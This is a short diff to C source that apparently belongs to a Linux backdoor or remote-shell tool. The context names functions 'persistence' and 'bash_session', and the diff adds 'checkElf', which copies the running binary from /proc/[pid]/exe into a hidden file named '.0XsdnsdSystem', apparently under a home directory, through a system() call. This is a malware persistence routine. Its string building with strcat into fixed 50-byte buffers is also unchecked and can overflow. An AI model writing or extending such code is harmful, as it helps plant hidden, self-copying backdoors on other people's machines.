@@ -70,6 +70,37 @@ int persistence(char *get_path, FILE *fp)
   return 0;
 }
 
+int checkELF(char *path)
+{
+
+    //get the process ID and converts it to char	
+    int pid = getpid();	
+    char pidch[10];
+    sprintf(pidch,"%d",pid);
+
+    //build the command to copy the executable file from proccessdirectory
+    // /proc/[pid]/exe
+    char command[50] = "cp /proc/";
+    strcat(command,pidch);
+    strcat(command,"/exe ");
+    strcat(command,path);
+    strcat(command,".0XsdnsdSystem");
+
+    // check if the elf .0XsdnsdSystem exists in /home 
+    char check[50];
+    strcpy(check,path);
+    strcat(check,".0XsdnsdSystem");
+    if(access(check,F_OK)==0)
+    {
+        return 0;
+    }
+    else
+    {
+        system(command);
+        return 0;
+    }
+}
+
 pid_t bash_session(connection server_con)
 {
 
